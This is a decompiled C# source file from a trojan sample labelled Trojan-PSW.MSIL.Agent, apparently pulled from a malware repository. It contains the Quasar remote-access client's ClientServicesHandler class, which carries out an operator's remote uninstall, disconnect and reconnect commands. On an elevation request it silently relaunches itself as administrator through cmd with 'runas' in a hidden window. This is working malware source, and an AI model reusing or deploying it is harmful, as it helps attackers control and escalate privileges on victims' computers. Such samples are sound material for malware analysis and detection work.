// Decompiled with JetBrains decompiler
// Type: Quasar.Client.Messages.ClientServicesHandler
// Assembly: Client, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C3C7FC-0EA2-48C4-8CEF-33A8CFDA287C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Agent.anew-0b84e664c8b592aa0220d52841629b2accb41f1f624720331000ab5f2f0ed628.exe

using Quasar.Client.Config;
using Quasar.Client.Networking;
using Quasar.Client.Setup;
using Quasar.Client.User;
using Quasar.Client.Utilities;
using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace Quasar.Client.Messages
{
  public class ClientServicesHandler : IMessageProcessor
  {
    private readonly QuasarClient _client;
    private readonly QuasarApplication _application;

    public ClientServicesHandler(QuasarApplication application, QuasarClient client)
    {
      this._application = application;
      this._client = client;
    }

    public bool CanExecute(IMessage message)
    {
      switch (message)
      {
        case DoClientUninstall _:
        case DoClientDisconnect _:
        case DoClientReconnect _:
          return true;
        default:
          return message is DoAskElevate;
      }
    }

    public bool CanExecuteFrom(ISender sender) => true;

    public void Execute(ISender sender, IMessage message)
    {
      switch (message)
      {
        case DoClientUninstall message1:
          this.Execute(sender, message1);
          break;
        case DoClientDisconnect message2:
          this.Execute(sender, message2);
          break;
        case DoClientReconnect message3:
          this.Execute(sender, message3);
          break;
        case DoAskElevate message4:
          this.Execute(sender, message4);
          break;
      }
    }

    private void Execute(ISender client, DoClientUninstall message)
    {
      client.Send<SetStatus>(new SetStatus()
      {
        Message = "Uninstalling... good bye :-("
      });
      try
      {
        new ClientUninstaller().Uninstall();
        this._client.Exit();
      }
      catch (Exception ex)
      {
        client.Send<SetStatus>(new SetStatus()
        {
          Message = "Uninstall failed: " + ex.Message
        });
      }
    }

    private void Execute(ISender client, DoClientDisconnect message) => this._client.Exit();

    private void Execute(ISender client, DoClientReconnect message) => this._client.Disconnect();

    private void Execute(ISender client, DoAskElevate message)
    {
      if (new UserAccount().Type != AccountType.Admin)
      {
        ProcessStartInfo startInfo = new ProcessStartInfo()
        {
          FileName = "cmd",
          Verb = "runas",
          Arguments = "/k START \"\" \"" + Application.ExecutablePath + "\" & EXIT",
          WindowStyle = ProcessWindowStyle.Hidden,
          UseShellExecute = true
        };
        this._application.ApplicationMutex.Dispose();
        try
        {
          Process.Start(startInfo);
        }
        catch
        {
          client.Send<SetStatus>(new SetStatus()
          {
            Message = "User refused the elevation request."
          });
          this._application.ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);
          return;
        }
        this._client.Exit();
      }
      else
        client.Send<SetStatus>(new SetStatus()
        {
          Message = "Process already elevated."
        });
    }
  }
}
